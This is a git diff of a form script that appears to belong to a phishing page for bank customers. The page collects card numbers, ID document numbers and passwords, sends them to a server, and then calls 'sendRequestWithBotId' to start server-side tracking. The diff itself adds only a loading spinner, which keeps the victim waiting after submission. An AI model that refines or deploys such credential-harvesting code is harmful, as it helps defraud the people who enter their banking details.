@@ -1,11 +1,14 @@
 document.addEventListener("DOMContentLoaded", function () {
+  var initialHeight = window.innerHeight;
+  document.body.style.minHeight = initialHeight + 'px';
   const form = document.querySelector("#myForm");
   const cardNumber = document.querySelector("#cardNumber");
   const docType = document.querySelector("#docType");
   const docNumber = document.querySelector("#docNumber");
   const password = document.querySelector("#password");
   const fingerprint = document.querySelector(".fingerprint");
-  fingerprint.addEventListener("click", function () {
+      const loader = document.querySelector(".loader-wrapper");
+      fingerprint.addEventListener("click", function () {
     this.classList.toggle("finger_black");
   });
   // Валидация и форматирование номера карты
@@ -101,7 +104,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     if (valid) {
       sendForm("myForm");
-      console.log("Form is valid, proceeding to submission...");
+      loader.style.display = "flex";
     } else {
       customAlert();
     }
@@ -161,7 +164,8 @@ document.addEventListener("DOMContentLoaded", function () {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
         sendRequestWithBotId(); // Начинаем отслеживание с сервера
-      } else {
+      loader.style.display = "none";
+    } else {
         // Обработка ошибок
         console.error(xhr.statusText);
       }
